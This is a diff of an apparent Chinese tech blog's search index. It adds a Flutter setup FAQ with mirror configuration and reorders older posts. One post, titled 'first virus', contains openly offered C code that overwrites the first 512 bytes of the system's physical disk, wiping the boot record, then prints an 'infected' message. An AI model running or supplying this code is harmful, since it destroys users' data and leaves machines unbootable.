@@ -3,6 +3,50 @@
   
     
     <entry>
+      <title><![CDATA[flutter开发常见问题]]></title>
+      <url>/2025/flutter-faq/</url>
+      <content type="html"><![CDATA[<p>flutter 开发常见问题<br><a id="more"></a></p>
+<ol>
+<li>下载flutter</li>
+</ol>
+<p>windows 下载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://storage.googleapis.com/flutter_infra_release/releases/stable/windows/flutter_windows_3.29.2-stable.zip</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li><p>环境变量配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn</span><br><span class="line">PUB_HOSTED_URL=https://pub.flutter-io.cn</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>排查Running Gradle task ‘assembleDebug’…慢问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd android</span><br><span class="line">.\gradlew.bat clean</span><br><span class="line"></span><br><span class="line">查看那个下载慢，就把对应的包放到.gradle\caches\modules-2\files-2.1\</span><br><span class="line"></span><br><span class="line">例如：kotlin-compiler-embeddable 1.8.22</span><br><span class="line">目录：org.jetbrains.kotlin\kotlin-compiler-embeddable\1.8.22\d539a5dfaa4137bfdfec1322f569e8797da51d21</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>gradle-wrapper 镜像配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#distributionUrl=https\://services.gradle.org/distributions/gradle-8.10.2-all.zip</span><br><span class="line">distributionUrl=https\://mirrors.cloud.tencent.com/gradle/gradle-8.10.2-all.zip</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>gradle maven镜像配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android\build.gradle.kts</span><br><span class="line">maven &#123; url=uri(&quot;https://mirrors.tencent.com/nexus/repository/maven-public/&quot;) &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>flutter命令行创建项目</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flutter create my_app</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+]]></content>
+      
+        <categories>
+            
+            <category> android </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> android </tag>
+            
+            <tag> flutter </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[chrome-driver安装]]></title>
       <url>/2025/chromedriver-download/</url>
       <content type="html"><![CDATA[<p>在自动化测试和网络爬虫开发中，chromedriver是连接 Selenium 与 Chrome 浏览器的核心桥梁。然而，安装过程中版本不匹配、路径配置错误等问题常常让人头疼。本文从实战出发，手把手教你如何快速安装并验证 ChromeDriver，避开常见“坑点”！</p>
@@ -3796,21 +3840,23 @@ y_i=\sum_jw_jx_{ij}</script><ol>
     </entry>
     
     <entry>
-      <title><![CDATA[javascript写九九乘法表]]></title>
-      <url>/2013/javascript-jiujiuchengfabiao/</url>
-      <content type="html"><![CDATA[<p>这篇文章主要讲解 九九乘法表<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">       tr td&#123;</span><br><span class="line">         border:2px solid green;</span><br><span class="line">         font-size:20px;</span><br><span class="line">         font-weight:bold;</span><br><span class="line">       &#125;</span><br><span class="line">       &lt;/style&gt;</span><br><span class="line">       &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">       document.write(&quot;&lt;table&gt;&quot;);</span><br><span class="line">       for(var x=1;x&lt;=9;x++)&#123;</span><br><span class="line">            document.write(&quot;&lt;tr&gt;&quot;);</span><br><span class="line">            for(var y=1;y&lt;=x;y++)&#123;</span><br><span class="line">                document.write(&quot;&lt;td&gt;&quot; + y + &quot;*&quot; + x + &quot;=&quot; + (x*y) + &quot;&lt;/td&gt;&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">            document.write(&quot;&lt;/tr&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        document.write(&quot;&lt;/table&gt;&quot;);</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+      <title><![CDATA[第一个病毒]]></title>
+      <url>/2013/first-virus/</url>
+      <content type="html"><![CDATA[<p>这篇文章主要讲解 使用c写一个小程序<br>下面是初学c语言写的代码（测试，自行承担后果哦）：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line"> </span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line"> char buffer[512]=&quot;0&quot;;</span><br><span class="line">    FILE * fd=fopen(&quot;\\\\.\\PHYSICALDRIVE0&quot;,&quot;rb+&quot;); </span><br><span class="line">    if (fd == NULL) </span><br><span class="line">        return 0;  </span><br><span class="line">    fseek(fd,0,SEEK_SET); </span><br><span class="line">    fwrite(buffer,512,1,fd);</span><br><span class="line"> printf(&quot;hello,你中毒了！\n&quot;);</span><br><span class="line">    fclose(fd); </span><br><span class="line">    return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 ]]></content>
       
         <categories>
             
-            <category> javascript </category>
+            <category> c </category>
             
         </categories>
         
         
         <tags>
             
-            <tag> javascript </tag>
+            <tag> c </tag>
+            
+            <tag> 病毒 </tag>
             
         </tags>
         
@@ -3841,23 +3887,21 @@ y_i=\sum_jw_jx_{ij}</script><ol>
     </entry>
     
     <entry>
-      <title><![CDATA[第一个病毒]]></title>
-      <url>/2013/first-virus/</url>
-      <content type="html"><![CDATA[<p>这篇文章主要讲解 使用c写一个小程序<br>下面是初学c语言写的代码（测试，自行承担后果哦）：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line"> </span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line"> char buffer[512]=&quot;0&quot;;</span><br><span class="line">    FILE * fd=fopen(&quot;\\\\.\\PHYSICALDRIVE0&quot;,&quot;rb+&quot;); </span><br><span class="line">    if (fd == NULL) </span><br><span class="line">        return 0;  </span><br><span class="line">    fseek(fd,0,SEEK_SET); </span><br><span class="line">    fwrite(buffer,512,1,fd);</span><br><span class="line"> printf(&quot;hello,你中毒了！\n&quot;);</span><br><span class="line">    fclose(fd); </span><br><span class="line">    return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+      <title><![CDATA[javascript写九九乘法表]]></title>
+      <url>/2013/javascript-jiujiuchengfabiao/</url>
+      <content type="html"><![CDATA[<p>这篇文章主要讲解 九九乘法表<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">       tr td&#123;</span><br><span class="line">         border:2px solid green;</span><br><span class="line">         font-size:20px;</span><br><span class="line">         font-weight:bold;</span><br><span class="line">       &#125;</span><br><span class="line">       &lt;/style&gt;</span><br><span class="line">       &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">       document.write(&quot;&lt;table&gt;&quot;);</span><br><span class="line">       for(var x=1;x&lt;=9;x++)&#123;</span><br><span class="line">            document.write(&quot;&lt;tr&gt;&quot;);</span><br><span class="line">            for(var y=1;y&lt;=x;y++)&#123;</span><br><span class="line">                document.write(&quot;&lt;td&gt;&quot; + y + &quot;*&quot; + x + &quot;=&quot; + (x*y) + &quot;&lt;/td&gt;&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">            document.write(&quot;&lt;/tr&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        document.write(&quot;&lt;/table&gt;&quot;);</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
 ]]></content>
       
         <categories>
             
-            <category> c </category>
+            <category> javascript </category>
             
         </categories>
         
         
         <tags>
             
-            <tag> c </tag>
-            
-            <tag> 病毒 </tag>
+            <tag> javascript </tag>
             
         </tags>
         
